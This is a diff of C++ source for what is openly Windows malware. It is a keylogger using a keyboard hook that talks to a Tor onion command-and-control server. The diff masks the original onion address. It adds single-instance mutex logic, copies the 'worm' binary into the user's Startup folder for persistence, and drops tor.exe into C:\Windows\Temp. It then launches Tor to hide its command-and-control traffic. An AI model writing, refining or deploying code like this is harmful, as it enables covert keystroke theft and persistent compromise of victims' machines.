@@ -13,7 +13,7 @@
 #include <filesystem>
 #define MSG_NOSIGNAL        0
 #define MAX                 65536
-#define cnc_onion_server    "z2b5cjxk4utmaktdrwiz5qlzxqve5rjedmplqgrceutvmurwadlc4gqd.onion"
+#define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"
 
 HHOOK hHook;
 
@@ -284,8 +284,17 @@ void keylog()
     }
 }
 
+void start_tor()
+{
+    FILE *c_03 = popen("C:\\Windows\\Temp\\tor.exe", "r");
+    (void)pclose(c_03);
+}
+
 int main(int argc, char **argv)
 {
+    HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
+    if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;
+
     //FreeConsole();
     AllocConsole();
     HWND window = FindWindowA("ConsoleWindowClass", NULL);
@@ -300,15 +309,23 @@ int main(int argc, char **argv)
     std::filesystem::path path = std::filesystem::current_path();
     std::string path_string{path.u8string() + "\\"};
     str.erase(str.find(path_string));
-    std::string startup_directory = "\"%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+    std::string startup_directory = "%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
     std::string dir_place_worm = startup_directory + "\\" + str;
-    std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" " + dir_place_worm + "*\" /Y";
+    std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" \"" + dir_place_worm + "*\" /Y";
     const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
-    system(cmd_copy_worm_startup_p);
-    dir_place_worm = startup_directory + "\\" + "tor.exe";
-    cmd_copy_worm_startup = "xcopy \".\\" + "tor.exe" + "\" " + dir_place_worm + "*\" /Y";
+    FILE *c_01 = popen(cmd_copy_worm_startup_p, "r");
+    (void)pclose(c_01);
+    cmd_copy_worm_startup = "copy tor.exe C:\\Windows\\Temp\\tor.exe /Y";
     const char *cmd_copy_worm_startup_q = cmd_copy_worm_startup.c_str();
-    system(cmd_copy_worm_startup_q);
+    FILE *c_02 = popen(cmd_copy_worm_startup_q, "r");
+    (void)pclose(c_02);
+    std::string startup_directory_del = "\"%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+    std::string n = "del " + startup_directory_del + "\\tor.exe\"";
+    FILE *c_04 = popen(n.c_str(), "r");
+    (void)pclose(c_04);
+    std::thread th(start_tor);
+    th.join();
+    std::this_thread::sleep_for(std::chrono::seconds(90));
 
     WSADATA wsaData;
     char recv_buf[MAX] = {};
